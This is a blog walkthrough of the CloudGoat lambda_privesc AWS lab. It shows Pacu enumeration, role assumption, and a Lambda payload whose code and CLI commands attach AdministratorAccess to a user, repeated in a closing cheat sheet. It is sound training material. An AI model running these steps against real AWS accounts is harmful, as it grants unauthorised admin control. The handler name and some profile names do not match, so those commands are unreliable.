---
title: "Cloudgoat Lambda Privesc"
date: 2025-05-19
draft: false
language: en
featured_image: ../assets/images/posts/lambda_privesc_challenge.png
summary: A walkthrough of the Lambda Privesc easy Cloudgoat challenge
authorimage: ../assets/images/posts/cyber-immuno-fusion.png
categories: Blog
tags: ["AWS Pentesting", "Lambda", "Cloudgoat", "Privilege Escalation"]
---
# Introduction & Context

Hey guys, this is a write-up for the Lambda_privesc challenge from Cloudgoat, available [here](https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/lambda_privesc/README.md). This is a challenge focused on assuming a role and then using that to escalate permissions via a vulnerable account. The account allows you to run a lambda function, eventually allowing you to gain full admin access. This is another challenge part of the Tyler's [Intro to AWS Pentesting course](https://academy.simplycyber.io/l/pdp/introduction-to-aws-pentesting). But I was able to do this one on my own, so it's definetly doable. I will note that I did read the summaryof the challenge which gave a decent hint on the attack path, but I'll explain how you could find that too on your own. Now onto the lab!

# Setup

We need to start up cloudgoat first and then add the profile details in to an account as well.

```bash
cloudgoat create lambda_privesc
#You'll get something like: 
cloudgoat_output_chris_access_key_id = A_KEY_ID
cloudgoat_output_chris_secret_key = SECRET_KEY_VALUE
```

Add the keys using `aws configure --profile lambda_priv`.

Then of course, let's just verity it works by running `aws sts get-caller-identity --profile lambda_priv`. It should work just like that. Once that is set up, we start enumerating.

# Enumeration!

## Enumerate ourself

There's more than a couple ways of doing this, I'm trying to get familiar with Pacu, so that's the path I went down. One thing I did learn though is that a potential 'flaw' of automated enumeration is you often get a lot of information. Sometimes too much. You'll need to be able to find the key information and ignore the 'noise' that comes along with it. But you'll see that when time comes. Let's start by launching pacu and then grabbing the keys from our aws profile.

```bash
pacu
import_keys lambda_priv
```

Now in the last cloudgoat challenge I did this command didn't work and I had to bruteforce it, but let's just give it a shot. Run `run iam__enum_permissions`. And surprise surprise, it worked! Maybe too well. If you run `whoami` to check what it finds, you'll see a lot of permissions. The important things I think to note are:

* Lots of IAM permissions
  * From the cheatsheet in the course, he mentions the `assume-role` permission could be helpful, so note that down.
* Nothing explicilty denied
  * If something is denied in a CTF, it's probably something to go after I would think
* A policy called `cg-chris-policy-cgidasldh6kuco` is attached.
  * This might be useful, depending on what this could do. We'll see.

## Enumerate the environment

I'm going to continue using pacu for this (I promise it's just enumeration I'm going to automate here). But run `run iam__enum_users_roles_policies_groups` and we'll get some useful results. If you run `data iam` you can see the output. But if you're like me, you'll find it a bit overwhelming, sinces there's so much. It may be helpful to filter on the 4 categories by running commands like `data iam Users` to view a section's data one at a time. 

### Group

No groups found on this challenge, off to the next one.

### Policies

1. The first policy is the one attached to us. Nothing really extra helpful here.
2. The second policy is new. A policy related to a lambdaManager. This could be helpful. The lab is focused on using lambda for privilege sscalation, so this has to be important.

### Roles

1. Default amazon role, not typically a target
2. Another default role
3. A debug role? This role is allow assumable by the a lambda thought it seems.
4. The lambdaManager role! We saw a policy related to this earlier. This role can be assumed by chris. It's called the lambda manager so it probably can run stuff related to lambdas.

### Users

1. Me!
2. The default cloudgoat account I would assume. Nothing too useful here

### Key Points

It would seem that Chris can take on the role of the lambda manager. There is another debug role that can only be accessed by a lambda. That combined by the summary on the scenario page, gives a good idea of the attack path. We take on the role of the lambda manager then run a lambda using the debug role to grant ourselves admin access.

Now as I was thinking this through, I looked up potential attack paths using a lambda function and found [this page](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/). If you scroll down to 15, you'll find a mini walkthrough of all the steps we need to get ourselves the admin access we want. This is the privilege escalation we'll take. I'll walk through this next.

Now I'll note that I said it 'seems' and 'probably' when discussing the roles. I never actually verified the information on those roles, I kinda just went off the names. Not the best thing in hindsight. So if you want to verify it before going on run `aws iam get-policy-version --policy-arn arn:aws:iam::381491899745:policy/cg-lambdaManager-policy-cgidasldh6kuco --version-id v1 --profile chris` (replace the arn with the 2nd policy from the list of policies found)

# Privilege Escalation

## Assume Role

So first thing is to figure out how to assume the role of the lambda manager. I asked ChatGPT for the command: `aws sts assume-role --role-arn arn:aws:iam::381491899745:role/cg-lambdaManager-role-cgidasldh6kuco --role-session-name escalateSession --region us-east-1 --output json --profile lambda_priv`. Quite a long one.

Once you run that you'll get a json response detailing some credentials and the session token to take on this new role. Same way as we configured the first one, but we'll need to add they session in manually afterwards:

```bash
aws configure --profile lambda_priv_new
#Pass in keys
aws configure set profile.lambda_priv_new.aws_session_token PASTEVALUEHERE
```

And verify you got this new role by running `aws sts get-caller-identity` and it should tell you that you're the lambda manager!

## Strike!

Now to launch the actual attack, I copied pasted the instructions from the [website](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/) we found earlier,  and has ChatGPT provide the code and commands needed.

First step is to create the python code that will give you the admin access policy. Create a file caled `exploit.py`.

```python
import boto3

def lambda_handler(event, context):
    iam = boto3.client('iam')
    response = iam.attach_user_policy(
        UserName='chris-cgidasldh6kuco',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    return {
        'statusCode': 200,
        'body': response
    }
```

If you aren't familiar with python, this script is adding a new policy to the `Chris` user. It's defining a function called `lambda_handler` that takes in a couple values and then attempts to add a user policy  to `Chris`. Not very error safe though, it's just returning 200, but if something does go wrong, we'd probably see the results in the log. 

We need to zip it up too before we can send it. You can do that by running `zip payload.zip exploit.py`. Then we gotta crete the function using this command:

```bash
aws lambda create-function --function-name escalate-admin-cg --runtime python3.9 --role arn:aws:iam::381491899745:role/cg-debug-role-cgidasldh6kuco --handler lambda_function.lambda_handler --zip-file fileb://payload.zip --region us-east-1 --profile lambda_priv_new
```

Note:

* We're setting the runtime to python 3.9
* The role being assigned is the debug role, which has admin access
* We're running it using the new role we assumed.
* Think of as manipulating a file that has root access on a linux machine. We're running the lambda using a role that has superior access to give us administrator access.

Next we invoke the function using

```bash
aws lambda invoke --function-name escalate-admin-cg output.txt --region us-east-1 --profile lambda_priv_new
```

It said 200 in the response, which is generally a good thing. Let's check if we have the role attached to the chris user now with:

```bash
aws iam list-attached-user-policies --user-name chris-cgidasldh6kuco --region us-east-1 --profile lambda_priv
```

The response should now show we have `AdministratorAccess` on our policy list. And that's the end!

# Conclusion

We managed to find a couple of roles with elevated permissions. We could not directly take on the role with admin access, but were able to go through a 'middleman' to get the super account to run a lambda function. We had that lambda function execute a python script that gave us the admin access. Quite a long attack chain, but there we go, Pprivilege escalation using lambda functions.

*Don't forget to run the following commands to shut down your resources in AWS*

```bash
cloudgoat destroy lambda_privesc
aws lambda delete-function --function-name escalate-admin-cg
```

# Cheat Sheet

To close off, here's a quick summary of the commands we needed to run to complete this module. If you're ever coming back to this and just need that one command, this is the section to check.

```bash
#Start Up
cloudgoat create lambda_privesc
aws configure --profile lambda_priv

#Enumeration of chris & environment
aws sts get-caller-identity --profile lambda_priv
pacu
    import_keys
    run iam__enum_permissions
    run iam__enum_users_roles_policies_groups
exit

aws iam get-policy-version --policy-arn arn:aws:iam::381491899745:policy/cg-lambdaManager-policy-cgidasldh6kuco --version-id v1 --profile chris

#Assume the new role
aws sts assume-role --role-arn arn:aws:iam::381491899745:role/cg-lambdaManager-role-cgidasldh6kuco --role-session-name escalateSession --region us-east-1 --output json --profile lambda_priv
aws configure --profile lambda_priv
aws configure set profile.lambda_priv_new.aws_session_token TOKEN
aws sts get-caller-identity --profile lambda_priv_new

#Attack!
#Create the exploit script
aws lambda create-function --function-name escalate-admin-cg --runtime python3.9 --role arn:aws:iam::381491899745:role/cg-debug-role-cgidasldh6kuco --handler lambda_function.lambda_handler --zip-file fileb://payload.zip --region us-east-1 --profile lambda_priv_new
aws lambda invoke --function-name escalate-admin-cg output.txt --region us-east-1 --profile lambda_priv_new
aws iam list-attached-user-policies --user-name chris-cgidasldh6kuco --region us-east-1 --profile lambda_priv

#Shut down
cloudgoat destroy lambda_privesc
aws lambda delete-function --function-name escalate-admin-cg
```

```

```
